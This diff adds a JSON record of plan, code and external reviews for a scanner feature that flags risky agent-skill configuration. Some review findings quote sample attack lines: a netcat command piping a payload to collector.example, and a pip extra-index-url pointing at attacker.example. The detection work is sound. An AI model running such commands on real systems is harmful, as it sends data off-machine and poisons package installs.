@@ -1,0 +1,318 @@
+{
+  "schema_version": 1,
+  "run_id": "iterate-2026-11-20-skill-surface-scan-rules",
+  "reviews": {
+    "self": {
+      "review_type": "self",
+      "status": "completed",
+      "findings_count": 0,
+      "findings": [],
+      "provider": null,
+      "completed_at": "2026-11-20T14:07:50.253578+00:00",
+      "disposition": null,
+      "recorded_by": "self-review",
+      "parse_status": null,
+      "raw_excerpt": null
+    },
+    "plan": {
+      "review_type": "plan",
+      "status": "completed",
+      "findings_count": 9,
+      "findings": [
+        {
+          "severity": "medium",
+          "category": "edge-case /",
+          "file": null,
+          "line": null,
+          "finding": "document expected false-positive behavior in `docs/guide.md`, and add at least one \"common legitimate pattern\" clean case per rule to the tests (table alignment, `npm publish` scripts, `--extra-index-url`, `--host 0.0.0.0` style settings) so tuning regressions are caught.",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "medium",
+          "category": "edge-case /",
+          "file": null,
+          "line": null,
+          "finding": "make the self-scan a measured/recorded probe (as the calibration section already frames it) rather than a blocking assertion, or give it an allowlist budget with a documented suppression marker.",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "low",
+          "category": "approach /",
+          "file": null,
+          "line": null,
+          "finding": "one `skill_surface_rules.py` with a rule table (id, pattern, description) plus the dispatcher would be materially simpler and just as testable. Not blocking if modules already exist and are coherent.",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "low",
+          "category": "risk /",
+          "file": null,
+          "line": null,
+          "finding": "grep for direct symbol imports of the moved code outside the plugin; keep the wrappers permanent and documented, or re-export via `__all__`.",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "low",
+          "category": "risk /",
+          "file": null,
+          "line": null,
+          "finding": "add an explicit test asserting every `SURFACE_` rule id emits severity ≤ `high` (the AC mentions this — make sure it's per-rule-id, not just on the six fixture cases), and note the coupling in `security.yml` as a comment.",
+          "suggestion": null,
+          "source": "external-review"
+        },
+        {
+          "severity": "high",
+          "category": "edge-case",
+          "file": null,
+          "line": null,
+          "finding": "Wiring the rules into `scan_file` does not establish that all required files reach them. Existing extension filters or text decoding could exclude `.npmrc`, agent settings, hook configuration, or an executable renamed as a document. The concealed-executable check especially needs raw bytes before text decoding.",
+          "suggestion": "Explicitly define discovery and dispatch for each supported surface. Run executable-signature checks before decoding, and add CLI tests proving that hidden configuration files and a binary disguised as a document are discovered and reported.",
+          "source": "external-review"
+        },
+        {
+          "severity": "medium",
+          "category": "approach",
+          "file": null,
+          "line": null,
+          "finding": "The rule-matching contracts are underspecified. “Default registry,” “runs a command by itself,” and “tool grant that covers everything” require format-specific interpretation. Raw text matching could flag comments and quoted examples while missing valid configuration variants. Tuning until this repository produces zero findings does not establish those boundaries.",
+          "suggestion": "Document supported configuration formats, relevant keys, registry defaults, and wildcard syntax. Test active settings against comments, examples, malformed input, and equivalent syntax. For registry checks, parse the URL and compare the actual hostname rather than using substring matching.",
+          "source": "external-review"
+        },
+        {
+          "severity": "medium",
+          "category": "risk",
+          "file": null,
+          "line": null,
+          "finding": "Capping severity proves only that these findings cannot trigger the current critical-severity gate. A decoding error, malformed configuration, or rule exception could still terminate the scanner and fail CI, contradicting “never stops a release.”",
+          "suggestion": "Define failure handling for the new advisory checks so failures produce diagnostics without aborting existing scanning. Add an end-to-end test covering malformed input and verify the scanner exit status and critical-gate behavior.",
+          "source": "external-review"
+        },
+        {
+          "severity": "low",
+          "category": "edge-case",
+          "file": null,
+          "line": null,
+          "finding": "The acceptance assertion asks for one finding per six cases but lists nine rule IDs, including multiple alternatives. A single fixture could legitimately trigger several rules, leaving deduplication and expected counts ambiguous.",
+          "suggestion": "Specify expected IDs and counts per isolated fixture, then add one overlapping fixture to establish whether multiple findings are intentional.  The modular approach and reuse of the existing finding schema and suppression mechanism are sound. Clarify discovery, matching semantics, and advisory failure handling before proceeding; those details determine whether the feature meets its stated coverage and release-safety guarantees.  SHIPWRIGHT_VERDICT: revise",
+          "source": "external-review"
+        }
+      ],
+      "provider": "openrouter",
+      "completed_at": "2026-11-20T14:07:50.548143+00:00",
+      "disposition": null,
+      "recorded_by": "external-review-json",
+      "parse_status": "structured",
+      "raw_excerpt": "[glm] ## Findings\n\n- **Category: edge-case / Severity: medium** — False-positive tuning was calibrated exclusively against this repository (22 → 0). That's overfitting: a user repo with legitimate `pip install --index-url` in a Dockerfile, an npm postinstall hook, or markdown tables with aligned columns (your \"table-padding\" case is nearly universal in docs) will very likely fire. Since the rules are advisory-only this degrades signal rather than blocks releases, but it means end users get noisy warnings the spec's own calibration rejected on your docs.\n  **Suggestion:** document expected false-positive behavior in `docs/guide.md`, and add at least one \"common legitimate pattern\" clean case per rule to the tests (table alignment, `npm publish` scripts, `--extra-index-url`, `--host 0.0.0.0` style settings) so tuning regressions are caught.\n\n- **Category: edge-case / Severity: medium** — The self-scan assertion \"zero SURFACE_* findings on this repo\" is a hard CI dependency on repo content. Any future PR that adds a markdown table or a docs example mentioning safety-rule overrides will break the build with a confusing scanner failure.\n  **Suggestion:** make the self-scan a measured/recorded probe (as the calibration section already frames it) rather than a blocking assertion, or give it an allowlist budget with a documented suppression marker.\n\n- **Category: approach / Severity: low** — Six checks (per AC19) spread across four new rule modules plus a dispatcher — five files for what are essentially regex/line filters. This is borderline over-production for a \"medium\" iterate.\n  **Suggestion:** one `skill_surface_rules.py` with a rule table (id, pattern, description) plus the dispatcher would be materially simpler and just as testable. Not blocking if modules already exist and are coherent.\n\n- **Category: risk / Severity: low** — Moving the dependency scanner \"verbatim\" into `prompt_scan_dependencies.py` changes its import surface. Any external caller (or test) i […truncated]\n\n[openai] 1. **Category:** edge-case  \n   **Severity:** high  \n   **Finding:** Wiring the rules into `scan_file` does not establish that all required files reach them. Existing extension filters or text decoding could exclude `.npmrc`, agent settings, hook configuration, or an executable renamed as a document. The concealed-executable check especially needs raw bytes before text decoding.  \n   **Suggestion:** Explicitly define discovery and dispatch for each supported surface. Run executable-signature checks before decoding, and add CLI tests proving that hidden configuration files and a binary disguised as a document are discovered and reported.\n\n2. **Category:** approach  \n   **Severity:** medium  \n   **Finding:** The rule-matching contracts are underspecified. “Default registry,” “runs a command by itself,” and “tool grant that covers everything” require format-specific interpretation. Raw text matching could flag comments and quoted examples while missing valid configuration variants. Tuning until this repository produces zero findings does not establish those boundaries.  \n   **Suggestion:** Document supported configuration formats, relevant keys, registry defaults, and wildcard syntax. Test active settings against comments, examples, malformed input, and equivalent syntax. For registry checks, parse the URL and compare the actual hostname rather than using substring matching.\n\n3. **Category:** risk  \n   **Severity:** medium  \n   **Finding:** Capping severity proves only that these findings cannot trigger the current critical-severity gate. A decoding error, malformed configuration, or rule exception could still terminate the scanner and fail CI, contradicting “never stops a release.”  \n   **Suggestion:** Define failure handling for the new advisory checks so failures produce diagnostics without aborting existing scanning. Add an end-to-end test covering malformed input and verify the scanner exit status and critical-gate behavior.\n\n4. **Category:** edge-cas […truncated]",
+      "verdicts": {
+        "glm": "approve",
+        "openai": "revise"
+      }
+    },
+    "code": {
+      "review_type": "code",
+      "status": "completed",
+      "findings_count": 5,
+      "findings": [
+        {
+          "severity": "medium",
+          "category": "correctness",
+          "file": "skill_surface_registry.py",
+          "line": null,
+          "finding": "uv array form and multi-line pip values never fire",
+          "suggestion": "fixed",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": "security",
+          "file": "skill_surface_hooks.py",
+          "line": null,
+          "finding": "prefix loopback match lets localhost.attacker.example pass",
+          "suggestion": "fixed: shared is_loopback",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": "correctness",
+          "file": "tests",
+          "line": null,
+          "finding": "AC02 tag credits false coverage",
+          "suggestion": "fixed: AC19 only",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": "correctness",
+          "file": "skill_surface_scan.py",
+          "line": null,
+          "finding": "_clamp case-sensitive, unknown values pass",
+          "suggestion": "fixed",
+          "source": "code-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": "readability",
+          "file": "skill_surface_scan.py",
+          "line": null,
+          "finding": "dead RULE_PREFIX/Emit and unused return value",
+          "suggestion": "fixed",
+          "source": "code-reviewer"
+        }
+      ],
+      "provider": null,
+      "completed_at": "2026-11-20T14:07:49.962043+00:00",
+      "disposition": null,
+      "recorded_by": "code-reviewer",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "model_tier": "opus",
+      "reviewer_notes": "All findings fixed with tests; dependency-scanner move confirmed behaviour-preserving."
+    },
+    "doubt": {
+      "review_type": "doubt",
+      "status": "completed",
+      "findings_count": 5,
+      "findings": [
+        {
+          "severity": "high",
+          "category": null,
+          "file": null,
+          "line": null,
+          "finding": "Claim under doubt: advisory code cannot drop existing findings — lone surrogate from a JSON-escaped url crashes the report write",
+          "suggestion": "fixed: emit makes text encodable; main --output regression test",
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": null,
+          "file": null,
+          "line": null,
+          "finding": "Claim under doubt: no regex blowup — registry regexes quadratic/cubic",
+          "suggestion": "fixed: linear regexes, timing tests",
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "medium",
+          "category": null,
+          "file": null,
+          "line": null,
+          "finding": "Claim under doubt: high cap is advisory — high enters remediation scope",
+          "suggestion": "fixed: cap lowered to medium",
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": null,
+          "file": null,
+          "line": null,
+          "finding": "Claim under doubt: tests would catch a broken cap — assertions tautological",
+          "suggestion": "fixed: emit-routes-through-cap test",
+          "source": "doubt-reviewer"
+        },
+        {
+          "severity": "low",
+          "category": null,
+          "file": null,
+          "line": null,
+          "finding": "Claim under doubt: few false positives — GitHub Packages / PyTorch index",
+          "suggestion": "fixed: hosts exempt, exact sections, fenced padding ignored",
+          "source": "doubt-reviewer"
+        }
+      ],
+      "provider": null,
+      "completed_at": "2026-11-20T14:07:50.099475+00:00",
+      "disposition": null,
+      "recorded_by": "doubt-reviewer",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "model_tier": "opus"
+    },
+    "external_code": {
+      "review_type": "external_code",
+      "status": "completed",
+      "findings_count": 2,
+      "findings": [
+        {
+          "severity": "medium",
+          "category": "bug",
+          "file": "plugins/shipwright-security/scripts/tools/skill_surface_hooks.py",
+          "line": 34,
+          "finding": "Standard hostname targets for netcat are missed. For example, `nc collector.example 4444 < payload.json` matches `_REMOTE_TOOL` but not `_REMOTE_TARGET`, so a hook sending data off-machine produces no `SURFACE_HOOK_REMOTE_SINK` finding.",
+          "suggestion": "Recognize hostname arguments for the supported network commands, including their usual space-separated host/port syntax. Add a regression test using this command.",
+          "source": "external-review"
+        },
+        {
+          "severity": "medium",
+          "category": "bug",
+          "file": "plugins/shipwright-security/scripts/tools/skill_surface_registry.py",
+          "line": 43,
+          "finding": "_foreign_host` checks only the first URL. Pip accepts multiple whitespace-separated extra indexes, so `extra-index-url = https://pypi.org/simple https://attacker.example/simple` returns no finding because the first host is exempt, even though installation also trusts the attacker’s index.",
+          "suggestion": "Inspect every configured index URL and report each non-default destination. Add a test with a default index followed by a foreign index.  The implementation covers the main acceptance scenarios, but these ordinary configuration forms evade the intended checks. Ship with fixes for these detection gaps.  SHIPWRIGHT_VERDICT: revise",
+          "source": "external-review"
+        }
+      ],
+      "provider": "openrouter",
+      "completed_at": "2026-11-20T14:07:50.393845+00:00",
+      "disposition": null,
+      "recorded_by": "external-review-json",
+      "parse_status": "partial",
+      "raw_excerpt": "[glm] ## Review\n\nI read the diff against the spec's ACs and hunted for correctness, security, test-quality, and regression issues.\n\n**Spec compliance:** All six rule families are implemented with the required ids; the clamp-to-`high` advisory contract is implemented (`_clamp`, `MAX_SEVERITY = \"high\"`) and tested; the marker-suppression policy (documentation only, not `SKILL.md`/agent dirs/JSON/registry) is implemented in `_marker_honoured` and tested; failure isolation (rule crash → stderr log, findings preserved) is implemented and tested both at `scan_file` and `main` level; the tree-walk/CLI-exit assertion is tested in `test_skill_surface_wiring.py`. The refactor of the dependency scanner into `prompt_scan_dependencies.py` is verbatim with thin wrappers — good.\n\n**Findings (all minor):**\n\n- Category: edge-case | Severity: low | `skill_surface_hooks.py` (`_target_is_remote`)\n  A `host:path` token that is not a URL is treated as remote unless it starts with `127.`/`0.0.0.0`; loopback is only exempted for the literal `127.x`/`0.0.0.0` prefixes and URL-parsed hosts. IPv6 loopback (`::1`, `[::1]:9000`) in a `nc`/`scp`-style target is not matched by `_REMOTE_TARGET` at all (miss), and an internal hostname like `build.lan:8080` is flagged (advisory FP, acknowledged in the guide). Suggestion: also exempt `localhost:`-prefixed tokens; acceptable as-is given advisory severity.\n\n- Category: edge-case | Severity: low | `skill_surface_prose.py` (`_scan_padding`)\n  A blank-line run at end-of-file (≥25 blank lines, nothing after) is never emitted because the flush only happens when a non-blank line follows. That's arguably correct (nothing is hidden), but a padding attack that appends the payload in a *later* trailing-whitespace-only context after CRLF tricks is not covered. No change required; noting the boundary.\n\n- Category: test | Severity: low | `test_skill_surface_prose.py` (`test_allowlist_marker_does_not_silence_agent_config`)\n  The test asserts the phrase is fla […truncated]\n\n[openai] - Category: bug\n- Severity: medium\n- File: plugins/shipwright-security/scripts/tools/skill_surface_hooks.py:34\n- Finding: Standard hostname targets for netcat are missed. For example, `nc collector.example 4444 < payload.json` matches `_REMOTE_TOOL` but not `_REMOTE_TARGET`, so a hook sending data off-machine produces no `SURFACE_HOOK_REMOTE_SINK` finding.\n- Suggestion: Recognize hostname arguments for the supported network commands, including their usual space-separated host/port syntax. Add a regression test using this command.\n\n- Category: bug\n- Severity: medium\n- File: plugins/shipwright-security/scripts/tools/skill_surface_registry.py:43\n- Finding: `_foreign_host` checks only the first URL. Pip accepts multiple whitespace-separated extra indexes, so `extra-index-url = https://pypi.org/simple https://attacker.example/simple` returns no finding because the first host is exempt, even though installation also trusts the attacker’s index.\n- Suggestion: Inspect every configured index URL and report each non-default destination. Add a test with a default index followed by a foreign index.\n\nThe implementation covers the main acceptance scenarios, but these ordinary configuration forms evade the intended checks. Ship with fixes for these detection gaps.\n\nSHIPWRIGHT_VERDICT: revise",
+      "verdicts": {
+        "openai": "revise",
+        "glm": "approve"
+      }
+    },
+    "spec": {
+      "review_type": "spec",
+      "status": "completed",
+      "findings_count": 0,
+      "findings": [],
+      "provider": null,
+      "completed_at": "2026-11-20T14:07:49.838276+00:00",
+      "disposition": null,
+      "recorded_by": "spec-reviewer",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "model_tier": "opus",
+      "ac_verdicts": [
+        {
+          "ac": "item-1",
+          "verdict": "matches",
+          "diff_location": "plugins/shipwright-security/scripts/tools/skill_surface_scan.py",
+          "reason": "scan_surface sends package-source files, hooks.json, settings.json and Markdown to the six rule modules and caps every finding, so all six cases are reported and none can stop a release.",
+          "weakens": false
+        }
+      ]
+    },
+    "plan_internal": {
+      "review_type": "plan_internal",
+      "status": "completed",
+      "findings_count": 0,
+      "findings": [],
+      "provider": null,
+      "completed_at": "2026-11-20T14:07:50.706307+00:00",
+      "disposition": null,
+      "recorded_by": "opus-plan-reviewer",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "model_tier": "opus"
+    },
+    "architecture_internal": {
+      "review_type": "architecture_internal",
+      "status": "completed",
+      "findings_count": 0,
+      "findings": [],
+      "provider": null,
+      "completed_at": "2026-11-20T14:07:50.841942+00:00",
+      "disposition": null,
+      "recorded_by": "architecture-internal-reviewer",
+      "parse_status": null,
+      "raw_excerpt": null,
+      "model_tier": "opus"
+    }
+  }
+}
